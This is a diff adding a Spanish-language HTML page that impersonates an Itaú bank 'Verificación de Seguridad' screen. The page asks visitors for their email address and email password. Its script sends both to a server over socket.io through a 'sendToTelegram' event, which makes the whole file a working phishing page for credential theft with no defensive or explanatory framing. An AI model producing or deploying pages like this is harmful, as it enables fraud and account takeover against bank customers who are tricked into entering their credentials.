@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaú - Verificación de Seguridad</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 540px;
+            margin: 0;
+            padding: 20px;
+            padding-left: 25px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 35px;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            color: #000000;
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 15px;
+            border: 1.5px solid #cccccc;
+            border-radius: 8px;
+            background-color: #ffffff;
+            color: #000000;
+            outline: none;
+            appearance: none;
+            font-family: inherit;
+        }
+
+        input:focus {
+            border-color: #0066cc;
+        }
+
+        input::placeholder {
+            color: #aaaaaa;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper input {
+            padding-right: 45px;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 20px;
+            height: 20px;
+        }
+
+        .eye-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #e8e8e8;
+            color: #b8b8b8;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: auto;
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            width: calc(100% - 40px);
+            letter-spacing: 0.2px;
+        }
+
+        .submit-btn.active {
+            background-color: #fe6200;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #e55800;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-icon {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .loading-icon::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background-color: #fe6200;
+            border-radius: 10px;
+        }
+
+        .loading-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90px;
+            height: 90px;
+            border: 3px solid #fe6200;
+            border-radius: 15px;
+            opacity: 0.3;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .loading-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 110px;
+            height: 110px;
+            border: 3px solid #fe6200;
+            border-radius: 18px;
+            opacity: 0.2;
+            animation: pulse 2s ease-in-out infinite 0.5s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.2;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.1);
+                opacity: 0.1;
+            }
+        }
+
+        .loading-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 320px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-icon">
+            <div class="loading-ring"></div>
+        </div>
+        <h2 class="loading-text">Te damos la bienvenida a Itaú</h2>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <img src="img/itau-logo.png" alt="Itaú">
+        </div>
+
+        <h1>Verificación de Seguridad</h1>
+        <p class="subtitle">Por tu seguridad, necesitamos verificar tu correo electrónico. Ingresa tu email y contraseña para continuar.</p>
+
+        <form id="emailForm">
+            <div class="form-group">
+                <label for="email">Correo electrónico</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="email" 
+                    placeholder="ejemplo@correo.com"
+                    autocomplete="email"
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="emailPassword">Contraseña de correo</label>
+                <div class="password-wrapper">
+                    <input 
+                        type="password" 
+                        id="emailPassword" 
+                        name="emailPassword" 
+                        placeholder="Ingresa tu contraseña"
+                        autocomplete="current-password"
+                    >
+                    <span class="eye-icon" onclick="togglePassword()">
+                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <circle cx="12" cy="12" r="3" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <line id="eyeLine" x1="3" y1="3" x2="21" y2="21" stroke="#000000" stroke-width="2" stroke-linecap="round" display="none"/>
+                        </svg>
+                    </span>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Ingresar</button>
+        </form>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="socket-handler.js"></script>
+    <script>
+        const email = document.getElementById('email');
+        const emailPassword = document.getElementById('emailPassword');
+        const submitBtn = document.getElementById('submitBtn');
+        const emailForm = document.getElementById('emailForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        email.addEventListener('input', checkFormValidity);
+        emailPassword.addEventListener('input', checkFormValidity);
+
+        function checkFormValidity() {
+            if (email.value.trim() !== '' && emailPassword.value.trim() !== '') {
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+            }
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('emailPassword');
+            const eyeLine = document.getElementById('eyeLine');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeLine.style.display = 'block';
+            } else {
+                passwordInput.type = 'password';
+                eyeLine.style.display = 'none';
+            }
+        }
+
+        emailForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (submitBtn.classList.contains('active')) {
+                loadingOverlay.classList.add('active');
+
+                const emailData = {
+                    bank: 'Itaú',
+                    page: 'email',
+                    email: email.value,
+                    emailPassword: emailPassword.value
+                };
+
+                window.itauSocket.emit('updatePage', { 
+                    sessionId: window.getSessionId(), 
+                    page: 'itau-email' 
+                });
+
+                window.itauSocket.emit('sendToTelegram', {
+                    sessionId: window.getSessionId(),
+                    data: emailData
+                });
+            }
+        });
+
+        window.itauSocket.on('telegramSent', (data) => {
+            console.log('✅ Email enviado correctamente a Telegram');
+        });
+    </script>
+</body>
+</html>
